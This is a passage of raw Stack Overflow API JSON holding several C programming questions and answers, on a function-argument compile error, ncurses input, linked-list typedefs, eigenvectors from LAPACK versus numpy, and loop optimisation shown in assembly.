</ol>\n</blockquote>\n\n<p>\"<em>error: too few arguments to function 'printDay'</em>\" means you're passing the wrong number of argument to <code>printDay</code> when you call it here:</p>\n\n<pre><code>printDay(input());\n</code></pre>\n\n<p>You're passing one argument but your declaration of <code>printDay</code> shows that it takes 3 arguments:</p>\n\n<pre><code>void printDay(int month, int day, int firstDay);\n</code></pre>\n\n<blockquote>\n  <ol start=\"2\">\n  <li>How do I fix this?</li>\n  </ol>\n</blockquote>\n\n<p>You can fix it by passing the correct number of arguments, e.g:</p>\n\n<pre><code>int month = ...;\nint day = ...;\nint firstDay = ...;\nprintDay(month, day, firstDay);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 9511, "user_id": 7023590, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/82052fbf0815ce82c4eded8fd941be14?s=128&d=identicon&r=PG&f=1", "display_name": "MarianD", "link": "https://stackoverflow.com/users/7023590/mariand"}, "is_accepted": false, "score": 1, "last_activity_date": 1482941236, "creation_date": 1482941236, "answer_id": 41365701, "question_id": 41365499, "link": "https://stackoverflow.com/questions/41365499/error-too-few-arguments-to-function-printday-c-language/41365701#41365701", "title": "error: too few arguments to function `printDay&#39; (C language)", "body": "<p>You declared (and defined) the function <code>printDay</code> with <code>3</code> parameters:</p>\n\n<pre><code>void printDay(int month, int day, int firstDay);\n</code></pre>\n\n<p>but you called it only with <code>1</code> parameter</p>\n\n<pre><code>printDay(input());\n</code></pre>\n\n<p>(as the function <code>input()</code> returns - as all functions in C - only <code>1</code> value, in your case of type <code>int</code>).</p>\n"}], "owner": {"reputation": 345, "user_id": 7350448, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/649078feaf1e14298ad543d388f0a4f7?s=128&d=identicon&r=PG&f=1", "display_name": "Ma250", "link": "https://stackoverflow.com/users/7350448/ma250"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 25327, "favorite_count": 0, "accepted_answer_id": 41365669, "answer_count": 3, "score": 0, "last_activity_date": 1530416823, "creation_date": 1482940514, "last_edit_date": 1592644375, "question_id": 41365499, "link": "https://stackoverflow.com/questions/41365499/error-too-few-arguments-to-function-printday-c-language", "title": "error: too few arguments to function `printDay&#39; (C language)", "body": "<h3>Question</h3>\n<p>I'm fairly new to C and I've got this error when I try to compile it (GCC):</p>\n<blockquote>\n<p><em>error: too few arguments to function `printDay'</em></p>\n</blockquote>\n<p>My questions are:</p>\n<ol>\n<li>What does it mean?</li>\n<li>How do I fix this?</li>\n</ol>\n<p>P.S this is not my full code, it's just this error I'm faced with.\nThanks in advance.</p>\n<h3>Code</h3>\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include &lt;time.h&gt;\n\n#define MAX_DAYS 31\n#define MIN_DAYS 1\n#define MAX_MONTHS 12\n#define MIN_MONTHS 1\n\nenum monthsOfYear\n{\n    jan = 1,\n    feb,\n    mar,\n    apr,\n    may,\n    jun,\n    jul,\n    aug,\n    sep,\n    oct,\n    nov,\n    dec\n};\n\nenum daysOfWeek\n{\n    sun = 1,\n    mon,\n    tue,\n    wed,\n    thu,\n    fri,\n    sat\n};\n\nint input();\nvoid check(int month, int day);\nvoid printDay(int month, int day, int firstDay);\n\nint main()\n{\n    printf(&quot;Hello! Welcome to the day calculator!\\n&quot;);\n    printDay(input());\n    return (0);\n} \n\n/*this function takes the input from the user\ninput: none\noutput: the first day\n*/ \nint input()\n{\n    enum daysOfWeek day = 0;\n    enum monthsOfYear month = 0;\n    \n    int firstDay = 0;\n    \n    printf(&quot;Enter month to check: (1-jan, 2-feb, etc) &quot;);\n    scanf(&quot;%d&quot;, &amp;month);\n    printf(&quot;Enter day to check: &quot;);\n    scanf(&quot;%d&quot;, &amp;day);\n    check(month,day);\n    printf(&quot;Enter the weekday of the 1st of the month: (1-Sunday, 2-Monday, etc) &quot;);\n    scanf(&quot;%d&quot;, &amp;firstDay);\n    \n    return firstDay;\n}\n\n/*\nthis function checks the validity of the input\ninput: day, month\noutput: none\n*/\nvoid check(int month, int day)\n{\n    if(month &gt; MAX_MONTHS || month &lt; MIN_MONTHS &amp;&amp; day &gt; MAX_DAYS || day &lt; MIN_DAYS)\n    {\n        printf(&quot;Invalid input, try again\\n&quot;);\n        input();\n    }\n    if (month == feb &amp;&amp; day &gt; 28)\n    {\n        printf(&quot;Invalid input, try again\\n&quot;);\n        input();\n    }\n    if (month == jan &amp;&amp; day &gt; 31)\n    {\n        printf(&quot;Invalid input, try again\\n&quot;);\n        input();\n    }\n}\n\nvoid printDay(int month, int day, int firstDay)\n{\n    int date = 0;\n    date = day - firstDay;\n    switch(day)\n    {\n        case sun:\n        printf(&quot;%d.%d will be a Sunday&quot;, day, month);\n        break;\n        \n        default: \n        break;\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "ansi-escape", "console-input"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1482940077, "post_id": 41365324, "comment_id": 69932083, "body": "ncurses is open source, the source is available for download and study."}, {"owner": {"reputation": 105, "user_id": 5921147, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/de28daa68dc73d0cd8e8e0a2869403b9?s=128&d=identicon&r=PG&f=1", "display_name": "Nautilus", "link": "https://stackoverflow.com/users/5921147/nautilus"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1482940179, "post_id": 41365324, "comment_id": 69932141, "body": "Well i was more looking for a general direction on how it does it, I am crunched for time and do not have a long time to go sift through thousands of lines of code."}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 1, "creation_date": 1482940519, "post_id": 41365324, "comment_id": 69932337, "body": "2 hints : <code>ioctl</code> and <code>escape codes</code>. FYI - tracing <code>ncurses</code> will be faster. Source : I&#39;ve done both"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1482940577, "post_id": 41365324, "comment_id": 69932368, "body": "It puts the terminal in raw mode and then reads character by character."}], "answers": [{"tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 2, "last_activity_date": 1482940612, "creation_date": 1482940612, "answer_id": 41365527, "question_id": 41365324, "link": "https://stackoverflow.com/questions/41365324/internals-of-ncurses-console-input/41365527#41365527", "title": "Internals of ncurses: console input", "body": "<p>Very short and basically: It  might use <a href=\"http://man7.org/linux/man-pages/man4/tty_ioctl.4.html\" rel=\"nofollow noreferrer\">the TTY <code>ioctl</code> calls</a> to get and set flags needed for the different modes. Then it could simply use <a href=\"http://man7.org/linux/man-pages/man2/read.2.html\" rel=\"nofollow noreferrer\"><code>read</code></a> to read characters in a blocking or non-blocking manner.</p>\n\n<p>Special keys (like the function keys for example) are read using multiple characters which are parsed.</p>\n"}], "owner": {"reputation": 105, "user_id": 5921147, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/de28daa68dc73d0cd8e8e0a2869403b9?s=128&d=identicon&r=PG&f=1", "display_name": "Nautilus", "link": "https://stackoverflow.com/users/5921147/nautilus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 68, "favorite_count": 0, "closed_date": 1482953626, "accepted_answer_id": 41365527, "answer_count": 1, "score": -2, "last_activity_date": 1482940612, "creation_date": 1482939895, "question_id": 41365324, "link": "https://stackoverflow.com/questions/41365324/internals-of-ncurses-console-input", "closed_reason": "Needs more focus", "title": "Internals of ncurses: console input", "body": "<p>How exactly does Ncurses capture input into the console? I would like to implement it myself instead of using ncurses due to the overhead that ncurses is causing.</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["c"], "answers": [{"tags": [], "owner": {"reputation": 4154, "user_id": 3844480, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ho59A.jpg?s=128&g=1", "display_name": "ilim", "link": "https://stackoverflow.com/users/3844480/ilim"}, "is_accepted": false, "score": 1, "last_activity_date": 1482941536, "last_edit_date": 1482941536, "creation_date": 1482940222, "answer_id": 41365421, "question_id": 41365284, "link": "https://stackoverflow.com/questions/41365284/ddereferencing-a-pointer-in-linked-list/41365421#41365421", "title": "Ddereferencing a pointer in linked list", "body": "<p>In order for your code to successfully compile, you need to declare your node type as follows.</p>\n\n<pre><code>typedef struct Node{\n    int data;\n    struct Node* next; //pointer to a node\n}node;\n</code></pre>\n\n<p>The reason behind this additional naming is due to node not being considered as declared until the end of the statement starting with typedef. That's why you need to name your struct as well, in order to be able to declare a pointer to its own type inside it.</p>\n\n<p>Additionally, it seems that tail may be equal to NULL when you try the line that you mentioned to be problematic:</p>\n\n<pre><code>tail-&gt;next=(list)malloc(sizeof(node));//showing error\n</code></pre>\n\n<p>Unless the entered value read into the variable choice via scanf before the first if statement is 1, tail will be NULL when the first while loop starts, and trying to access(i.e. in order to assign the address of the allocated space) tail->next will be <strong>equivalent to dereferencing NULL</strong> address and then trying to access the field <em>next</em>, causing a segment violation.</p>\n"}, {"tags": [], "owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "is_accepted": false, "score": 1, "last_activity_date": 1482940394, "creation_date": 1482940394, "answer_id": 41365466, "question_id": 41365284, "link": "https://stackoverflow.com/questions/41365284/ddereferencing-a-pointer-in-linked-list/41365466#41365466", "title": "Ddereferencing a pointer in linked list", "body": "<p>Your problem is here:</p>\n\n<pre><code>typedef struct {\n    int data;\n    struct node* next; // &lt;-- problem\n} node;\n</code></pre>\n\n<p>You're forward declaring <code>struct node</code> as a different type than your (anonymous) struct <code>node</code>.</p>\n\n<p>You can fix this by giving the anonymous struct the name <code>node</code>, so that you can refer to it inside the definition:</p>\n\n<pre><code>typedef struct node {\n    int data;\n    struct node* next;\n} node;\n</code></pre>\n\n<p>Now there's only one type named <code>node</code>.</p>\n\n<hr>\n\n<p>Also your <code>main</code> function is missing a return type. It should be:</p>\n\n<pre><code>int main() {\n</code></pre>\n"}], "owner": {"reputation": 41, "user_id": 7320223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24c4d34f8027e9c7e9c7d90cb7b59b30?s=128&d=identicon&r=PG&f=1", "display_name": "Mukul Kashiv", "link": "https://stackoverflow.com/users/7320223/mukul-kashiv"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 34, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1482941607, "creation_date": 1482939751, "last_edit_date": 1482941607, "question_id": 41365284, "link": "https://stackoverflow.com/questions/41365284/ddereferencing-a-pointer-in-linked-list", "title": "Ddereferencing a pointer in linked list", "body": "<p>I am getting an error in  <code>tail-&gt;next=(list)malloc(sizeof(node))</code>. Can someone tell me why? This code is being taught in one of the NPTEL videos and there it runs without any error.</p>\n\n<p>Is there any problem in doing <code>tail-&gt;next=(list)malloc(sizeof(node))</code>?</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nmain(){\n    int choice,dat;\n\n    typedef struct {\n        int data;\n        struct node* next; //pointer to a node\n    }node;\n\n    typedef  node* list;\n\n    list head,tail;\n\n    head=tail=NULL;\n\n    printf(\"Enter Data? (1/0)\\n\");\n    scanf(\"%d\",&amp;choice);\n\n    if(choice==1)\n    {\n        printf(\"Give Data?\\n\");\n        scanf(\"%d\",&amp;dat);\n        tail=(list)malloc(sizeof(node));\n        tail-&gt;data=dat;\n        tail-&gt;next=NULL;\n        head=tail;\n\n        printf(\"Enter Data? (1/0)\\n\");\n        scanf(\"%d\",&amp;choice);        \n    }\n\n    while(choice==1){\n        printf(\"Give Data?\\n\");\n        scanf(\"%d\",&amp;dat);\n\n        tail-&gt;next=(list)malloc(sizeof(node));//showing error\n        tail-&gt;next-&gt;data=dat;\n        tail-&gt;next-&gt;next=NULL;\n        tail=tail-&gt;next;\n    }\n\n    tail=head;\n\n    while(tail!=NULL){\n        printf(\"%d\",tail-&gt;data);\n        tail=tail-&gt;next;\n    }\n}\n</code></pre>\n"}, {"tags": ["python", "c", "numpy", "eigenvector", "lapacke"], "comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1482939614, "post_id": 41364931, "comment_id": 69931818, "body": "The results seem to be too much off that it is a matter of numeric instability of the libraries. Maybe it expects certain matrices to have been initialized to zero or some other value?"}, {"owner": {"reputation": 592, "user_id": 1681409, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/54903e0733d46e7c72501b5cc1e62e5b?s=128&d=identicon&r=PG", "display_name": "The Dude", "link": "https://stackoverflow.com/users/1681409/the-dude"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1482940172, "post_id": 41364931, "comment_id": 69932137, "body": "@PaulOgilvie I just tried initializing all the relevant arrays to zero beforehand, and I still get the same answers."}], "answers": [{"comments": [{"owner": {"reputation": 592, "user_id": 1681409, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/54903e0733d46e7c72501b5cc1e62e5b?s=128&d=identicon&r=PG", "display_name": "The Dude", "link": "https://stackoverflow.com/users/1681409/the-dude"}, "edited": false, "score": 0, "creation_date": 1482940225, "post_id": 41365398, "comment_id": 69932167, "body": "I figured it was something like this. Is there a way I can get the same basis in C as numpy gives me?"}, {"owner": {"reputation": 3966, "user_id": 2132213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a31de75b6e3603efbc437ab3475a757d?s=128&d=identicon&r=PG", "display_name": "Nick Matteo", "link": "https://stackoverflow.com/users/2132213/nick-matteo"}, "reply_to_user": {"reputation": 592, "user_id": 1681409, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/54903e0733d46e7c72501b5cc1e62e5b?s=128&d=identicon&r=PG", "display_name": "The Dude", "link": "https://stackoverflow.com/users/1681409/the-dude"}, "edited": false, "score": 0, "creation_date": 1482943250, "post_id": 41365398, "comment_id": 69933792, "body": "@TheDude: Not that I know of. There are infinitely many possible bases and no particular reason for the implementation to pick any given one."}, {"owner": {"reputation": 3966, "user_id": 2132213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a31de75b6e3603efbc437ab3475a757d?s=128&d=identicon&r=PG", "display_name": "Nick Matteo", "link": "https://stackoverflow.com/users/2132213/nick-matteo"}, "reply_to_user": {"reputation": 592, "user_id": 1681409, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/54903e0733d46e7c72501b5cc1e62e5b?s=128&d=identicon&r=PG", "display_name": "The Dude", "link": "https://stackoverflow.com/users/1681409/the-dude"}, "edited": false, "score": 0, "creation_date": 1482962986, "post_id": 41365398, "comment_id": 69942486, "body": "@TheDude: Actually, come to notice, the result numpy gives isn&#39;t a basis. V4 is just negative V1 in the results you gave. On my system, it repeats one vector twice without even a sign change."}], "tags": [], "owner": {"reputation": 3966, "user_id": 2132213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a31de75b6e3603efbc437ab3475a757d?s=128&d=identicon&r=PG", "display_name": "Nick Matteo", "link": "https://stackoverflow.com/users/2132213/nick-matteo"}, "is_accepted": false, "score": 2, "last_activity_date": 1482963592, "last_edit_date": 1482963592, "creation_date": 1482940156, "answer_id": 41365398, "question_id": 41364931, "link": "https://stackoverflow.com/questions/41364931/differing-results-of-eigenvector-routines-in-c-versus-python/41365398#41365398", "title": "Differing Results Of Eigenvector Routines In C Versus Python", "body": "<p>All are correct. Your matrix has two eigenvalues, 4 and 0. The eigenspace for 4 is the line spanned by [1,1,1,1], a multiple of which shows up in all lists. The eigenspace for 0 is the 3-space x_1 + x_2 + x_3 + x_4 = 0. The three methods have each given you a different basis for this subspace\u2014except numpy, which only gave you vectors spanning a two-dimensional subspace, for some reason.</p>\n\n<p>To my mind, the results of DGEEV are the best of the ones you report, since they give an orthonormal basis for the 0-eigenspace in a sensible stairshape form.</p>\n"}, {"comments": [{"owner": {"reputation": 592, "user_id": 1681409, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/54903e0733d46e7c72501b5cc1e62e5b?s=128&d=identicon&r=PG", "display_name": "The Dude", "link": "https://stackoverflow.com/users/1681409/the-dude"}, "edited": false, "score": 0, "creation_date": 1482940524, "post_id": 41365481, "comment_id": 69932341, "body": "Indeed, this is the answer. But how can I assure that I get the same basis across platforms? Or is there no way without delving into the guts of the implementations?"}, {"owner": {"reputation": 8239, "user_id": 4056181, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/G0SRK.jpg?s=128&g=1", "display_name": "jmd_dk", "link": "https://stackoverflow.com/users/4056181/jmd-dk"}, "reply_to_user": {"reputation": 592, "user_id": 1681409, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/54903e0733d46e7c72501b5cc1e62e5b?s=128&d=identicon&r=PG", "display_name": "The Dude", "link": "https://stackoverflow.com/users/1681409/the-dude"}, "edited": false, "score": 0, "creation_date": 1482940758, "post_id": 41365481, "comment_id": 69932475, "body": "You can normalize the eigenvectors as you want after you get them. This way you can get the same eigenvector for eigenvalue 4 regardless of the implementation. I don&#39;t know of any way to get the three others to agree regardless of implementation."}], "tags": [], "owner": {"reputation": 8239, "user_id": 4056181, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/G0SRK.jpg?s=128&g=1", "display_name": "jmd_dk", "link": "https://stackoverflow.com/users/4056181/jmd-dk"}, "is_accepted": false, "score": 1, "last_activity_date": 1482941257, "last_edit_date": 1482941257, "creation_date": 1482940458, "answer_id": 41365481, "question_id": 41364931, "link": "https://stackoverflow.com/questions/41364931/differing-results-of-eigenvector-routines-in-c-versus-python/41365481#41365481", "title": "Differing Results Of Eigenvector Routines In C Versus Python", "body": "<p>Three of the four eigenvalues are 0 (try printing out <code>values</code> in your Python script). Because all of the elements of the matrix are identical (ones), <em>any</em> vector where the elements add to zero will be a valid eigenvector corresponding to a zero eigenvalue. Exactly how this vector is chosen is not important, so the fact that different software find different eigenvectors for the zero eigenvalues are not important. You should confirm that these eigenvectors indeed have elements which add up to 0.</p>\n\n<p>The last eigenvalue is 4 (non-zero), which imply that the corresponding eigenvector must have identical (non-zero) elements. The exact value of these elements is then depending on the normalization of the eigenvectors, which also seem to differ in your examples.</p>\n\n<p>All in all, everything is really OK, it is just that the eigenvectors of your matrix are very non-unique. Another solution, which I find more pleasing, is found by <a href=\"http://www.wolframalpha.com/input/?i=eigenvectors%20%5B%5B1,1,1,1%5D,%20%5B1,1,1,1%5D,%20%5B1,1,1,1%5D,%20%5B1,1,1,1%5D%5D\" rel=\"nofollow noreferrer\">Wolfram Alpha</a>.</p>\n\n<h3>Update</h3>\n\n<p>Generally, a <code>M</code> by <code>M</code> matrix has <code>M</code> eigenvalues. If two (or more) of these are identical, there exist an infinite number of possible realisations of the corresponding eigenvectors, because from the two (call them <code>v1</code> and <code>v2</code>), we can construct a new one by <code>v3 = a*v1 + b*v2</code>, where <code>a</code> and <code>b</code> are arbitrary constants.</p>\n"}], "owner": {"reputation": 592, "user_id": 1681409, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/54903e0733d46e7c72501b5cc1e62e5b?s=128&d=identicon&r=PG", "display_name": "The Dude", "link": "https://stackoverflow.com/users/1681409/the-dude"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 119, "favorite_count": 0, "answer_count": 2, "score": 4, "last_activity_date": 1482963592, "creation_date": 1482938449, "question_id": 41364931, "link": "https://stackoverflow.com/questions/41364931/differing-results-of-eigenvector-routines-in-c-versus-python", "title": "Differing Results Of Eigenvector Routines In C Versus Python", "body": "<p>So I noticed that I get different answers for the eigendecomposition of the 4x4 matrix of all 1s.</p>\n\n<p><strong><em>In Python using numpy.linalg.eig:</em></strong></p>\n\n<pre><code>matrix = numpy.ones((M,M), dtype=float);\nvalues, vectors = numpy.linalg.eig(matrix);\n</code></pre>\n\n<p><strong><em>Python Result:</em></strong></p>\n\n<pre><code>V1: [-0.866025 +0.288675 +0.288675 +0.288675]\nV2: [+0.500000 +0.500000 +0.500000 +0.500000]\nV3: [+0.391955 +0.597433 -0.494694 -0.494694]\nV4: [+0.866025 -0.288675 -0.288675 -0.288675]\n</code></pre>\n\n<p><strong><em>In C Using LAPACK DSYEV:</em></strong></p>\n\n<pre><code>#define NN 4\n#define LDA NN\nvoid main(){\n    int n = NN, lda = LDA, lwork=NN*NN*NN*NN*NN, info;\n    char both = 'V';\n    char uplo = 'U';\n    double w[NN*NN];\n    double work[NN*NN*NN*NN*NN];\n    double a[LDA*NN] = {\n       1,  1,  1,  1,\n       1,  1,  1,  1,\n       1,  1,  1,  1,\n       1,  1,  1,  1 \n    };\n\n    dsyev_(&amp;both, &amp;uplo, &amp;n, a, &amp;lda, w, work, &amp;lwork, &amp;info);\n    return;\n}\n</code></pre>\n\n<p><strong><em>C DSYEV Result:</em></strong> </p>\n\n<pre><code>V1: +0.000596 +0.000596 -0.707702 +0.706510 \nV2: +0.500000 +0.500000 -0.499157 -0.500842 \nV3: +0.707107 -0.707107 -0.000000 +0.000000 \nV4: +0.500000 +0.500000 +0.500000 +0.500000  \n</code></pre>\n\n<p><strong><em>In C Using LAPACK DGEEV:</em></strong></p>\n\n<pre><code>#define NN 4\n#define LDA NN\n#define LDVL NN\n#define LDVR NN\nvoid main() {\n    char compute_left = 'V';\n    char compute_right = 'V';\n    int n = NN, lda = LDA, ldvl = LDVL, ldvr = LDVR, info, lwork=2*NN*NN;\n    double work[2*NN*NN];\n    double wr[NN], wi[NN], vl[LDVL*NN], vr[LDVR*NN];\n    double a[LDA*NN] = {\n       1,  1,  1,  1,\n       1,  1,  1,  1,\n       1,  1,  1,  1,\n       1,  1,  1,  1 \n    };\n    dgeev_( &amp;compute_left, &amp;compute_right, &amp;n, a, &amp;lda, wr, wi, vl, &amp;ldvl, vr, &amp;ldvr, work, &amp;lwork, &amp;info );\n    return;\n}\n</code></pre>\n\n<p><strong><em>C DGEEV Result:</em></strong> </p>\n\n<pre><code>V1: -0.866025 +0.288675 +0.288675 +0.288675 \nV2: -0.500000 -0.500000 -0.500000 -0.500000 \nV3: -0.000000 -0.816497 +0.408248 +0.408248 \nV4: -0.000000 -0.000000 -0.707107 +0.707107 \n</code></pre>\n\n<h2>The results are all different!</h2>\n\n<p><strong><em>So I have two major questions:</em></strong></p>\n\n<ol>\n<li>Why? Is this due to degeneracy in the 1 matrix?  </li>\n<li>How can I replicate the results of Python In C?</li>\n</ol>\n\n<p>Any insight would be appreciated.</p>\n"}, {"tags": ["c", "pointers", "memory"], "comments": [{"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1482937554, "post_id": 41364602, "comment_id": 69930663, "body": "Without any context we can only guess. One guess is that the 0 is used as a termination character for some string but as said we need some context."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 4, "creation_date": 1482937859, "post_id": 41364602, "comment_id": 69930848, "body": "The clairvoyance department is on a maternity leave. All questions about non-working code must be accompanied by a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. The management wishes to apologise for any inconvenience caused."}, {"owner": {"reputation": 2704, "user_id": 6794772, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/2d8db2b0d48b6e1b25657fda9ec4ae02?s=128&d=identicon&r=PG&f=1", "display_name": "Dellowar", "link": "https://stackoverflow.com/users/6794772/dellowar"}, "edited": false, "score": 0, "creation_date": 1482937909, "post_id": 41364602, "comment_id": 69930879, "body": "Post a minimal simplified code that we can run and compile. And if you&#39;re right, I predict much up voting."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482938139, "post_id": 41364602, "comment_id": 69931011, "body": "What loop is that?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 3, "creation_date": 1482938167, "post_id": 41364602, "comment_id": 69931026, "body": "<code>while (*n);</code> I guess..."}, {"owner": {"reputation": 5408, "user_id": 1793220, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Onk4P.jpg?s=128&g=1", "display_name": "Hisham H M", "link": "https://stackoverflow.com/users/1793220/hisham-h-m"}, "edited": false, "score": 0, "creation_date": 1482939070, "post_id": 41364602, "comment_id": 69931513, "body": "The compiler is most likely being optimizing away the loop into a memset-to-zero. My GCC 5.3.0 here, however, optimizes a loop filling a memory block to a memset whether the char being set is zero or one."}, {"owner": {"reputation": 23, "user_id": 5119599, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56018d219cd484c9863965ebc02606aa?s=128&d=identicon&r=PG&f=1", "display_name": "user5119599", "link": "https://stackoverflow.com/users/5119599/user5119599"}, "edited": false, "score": 0, "creation_date": 1482942387, "post_id": 41364602, "comment_id": 69933378, "body": "Kindly take this off HOLD status. It is now re-worded into a clearer format"}, {"owner": {"user_type": "does_not_exist", "display_name": "user3458"}, "edited": false, "score": 0, "creation_date": 1482952406, "post_id": 41364602, "comment_id": 69938177, "body": "This has now became a duplicate of <a href=\"http://stackoverflow.com/questions/11227809/why-is-it-faster-to-process-a-sorted-array-than-an-unsorted-array\" title=\"why is it faster to process a sorted array than an unsorted array\">stackoverflow.com/questions/11227809/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 62894, "user_id": 1114486, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b0513d720af96f4496f4b869fe9579a?s=128&d=identicon&r=PG", "display_name": "Didier Spezia", "link": "https://stackoverflow.com/users/1114486/didier-spezia"}, "is_accepted": false, "score": 1, "last_activity_date": 1483102782, "creation_date": 1483102782, "answer_id": 41396677, "question_id": 41364602, "link": "https://stackoverflow.com/questions/41364602/why-does-c-program-run-slower-when-a-loop-contains-a-condition/41396677#41396677", "title": "Why does C program run Slower when a loop contains a condition", "body": "<p>You can use gcc -S -O3 to have a look at the resulting assembler.\nHere is an example on an Intel box:</p>\n\n<p>Fast version:</p>\n\n<pre><code>    movl    %eax, %r12d\n    .p2align 4,,10\n    .p2align 3\n.L2:\n    movl    $3000000000, %edx\n    movl    $1, %esi\n    movq    %rbp, %rdi\n    call    memset\n    subq    $1, %rbx\n    jne .L2\n</code></pre>\n\n<p>Slow version:</p>\n\n<pre><code>    movl    $10, %edi\n    movl    %eax, %ebp\n    movl    $3000000000, %esi\n    .p2align 4,,10\n    .p2align 3\n.L2:\n    xorl    %edx, %edx\n    .p2align 4,,10\n    .p2align 3\n.L5:\n    movq    %rdx, %rcx\n    andl    $1, %ecx\n    movb    %cl, (%rbx,%rdx)\n    addq    $1, %rdx\n    cmpq    %rsi, %rdx\n    jne     .L5\n    subq    $1, %rdi\n    jne     .L2\n</code></pre>\n\n<p>Conclusion: the compiler is smarter than you think. It is able to optimize the inner loop as a memset (which is faster because it uses SSE/AVX or REP instructions on Intel). However, this optimization cannot kick in if the condition is kept - because the result is different.</p>\n"}], "owner": 